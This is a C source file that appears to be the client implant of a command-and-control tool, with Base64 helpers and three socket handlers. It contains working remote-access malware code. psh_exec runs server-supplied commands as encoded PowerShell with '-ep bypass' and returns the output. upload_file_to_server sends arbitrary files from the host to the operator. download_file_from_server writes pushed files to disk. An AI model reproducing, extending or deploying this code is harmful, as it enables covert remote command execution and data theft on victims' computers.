#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include "c2.h"
#include "client/utils.h"
#include "common.h"

const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// Encode binary data to Base64 text
void b64_encode(const unsigned char *in, int len, char *out) {
    int i = 0, j = 0;
    unsigned char c3[3];
    while (len--) {
        c3[i++] = *(in++);
        if (i == 3) {
            out[j++] = b64[c3[0] >> 2];
            out[j++] = b64[((c3[0] & 3) << 4) | (c3[1] >> 4)];
            out[j++] = b64[((c3[1] & 15) << 2) | (c3[2] >> 6)];
            out[j++] = b64[c3[2] & 63];
            i = 0;
        }
    }
    if (i) {
        out[j++] = b64[c3[0] >> 2];
        out[j++] = b64[((c3[0] & 3) << 4) | (i == 2 ? (c3[1] >> 4) : 0)];
        out[j++] = (i == 2 ? b64[(c3[1] & 15) << 2] : '=');
        out[j++] = '=';
    }
    out[j] = '\0';
}

// Reverse lookup table for Base64
int b64_rev[256];

void b64_init_rev() {
    for (int i = 0; i < 256; i++) b64_rev[i] = -1;
    for (int i = 0; i < 64; i++) b64_rev[(unsigned char)b64[i]] = i;
}

// Decode Base64 text to binary data
int b64_decode(const char *in, unsigned char *out) {
    b64_init_rev();
    
    int out_len = 0;
    int val = 0;
    int bits = -8;
    
    while (*in) {
        if (*in == '=') {
            break;  // Stop at padding
        }
        
        int c = b64_rev[(unsigned char)*in];
        if (c == -1) {
            in++;
            continue;  // Skip invalid chars
        }
        
        val = (val << 6) | c;
        bits += 6;
        
        if (bits >= 0) {
            out[out_len++] = (val >> bits) & 0xFF;
            bits -= 8;
        }
        
        in++;
    }
    
    return out_len;
}


int psh_exec(sock_t sock, const char *cmd) {
    if (!cmd || !*cmd) return -1;

    int cmdlen = (int)strlen(cmd);

    // powershell -enc expects Base64 of UTF-16LE encoded command
    unsigned short unicode[4096] = {0};
    if (cmdlen > (int)(sizeof(unicode)/sizeof(unicode[0]) - 1)) return -1;
    for (int i = 0; i < cmdlen; i++) unicode[i] = (unsigned short)(unsigned char)cmd[i];

    char encoded[8192];
    b64_encode((unsigned char*)unicode, cmdlen * 2, encoded);

    char fullcmd[8192];
    // Compose final command string for _popen
    snprintf(fullcmd, sizeof(fullcmd), "powershell.exe -ep bypass -enc %s", encoded);

    // Launch PowerShell and capture stdout pipe
    FILE *fp = _popen(fullcmd, "r");

    char buf[C2_BUF_SIZE];
    size_t total_len = 0;
    size_t alloc_size = C2_BUF_SIZE;
    char *output = malloc(alloc_size);
    if (!output) {
        pclose(fp);
        return 1;
    }

    while (fgets(buf, sizeof(buf), fp) != NULL) {
        size_t len = strlen(buf);

        // Expand buffer if needed
        if (total_len + len >= alloc_size) {
            alloc_size = (total_len + len) * 2;
            char *tmp = realloc(output, alloc_size);
            if (!tmp) {
                free(output);
                pclose(fp);
                return 1;
            }
            output = tmp;
        }

        memcpy(output + total_len, buf, len);
        total_len += len;
    }

    // Null-terminate
    output[total_len] = '\0';
    safe_send(sock, output, PSH_CMD, total_len + 1, 0);
    free(output);
    return 0;
}

void upload_file_to_server(sock_t sock, char* remote_path) {
    int status = 1;
    if (!remote_path) {
        status = 0;
    }

    size_t file_size = 0;
    char *file_buffer = read_file(remote_path, &file_size);
    if (!file_buffer || file_size > INT_MAX) {
        status = 0;
    }

    // Send status 
    send(sock, &status, sizeof(int), 0);

    // Send payload if status = 1
    if (status) safe_send(sock, file_buffer, DL_FILE_CMD, (int)file_size, 0);
    free(file_buffer);
    free(remote_path);
    return;
}

void download_file_from_server(sock_t sock, char *remote_path) {
    int status = 1;
    if (!remote_path) {
        return;
    }

    int incoming_size = 0;
    BYTE *file_buffer = (BYTE*)safe_recv(sock, NULL, &incoming_size, 0);
    if (!file_buffer) {
        status = 0;
    }

    if (remote_path[0] == '\0') {
        status = 0;
    }

    FILE *fp = fopen(remote_path, "wb");
    if (!fp) {
        status = 0;
        send(sock, &status, sizeof(int), 0);
        free(file_buffer);
        free(remote_path);
        return;
    }

    size_t expected = (size_t)incoming_size;
    size_t written = expected ? fwrite(file_buffer, 1, expected, fp) : 0;
    fclose(fp);

    if (written != expected) {
        status = 0;
    }
    send(sock, &status, sizeof(int), 0);

    free(remote_path);
    free(file_buffer);
    return;
}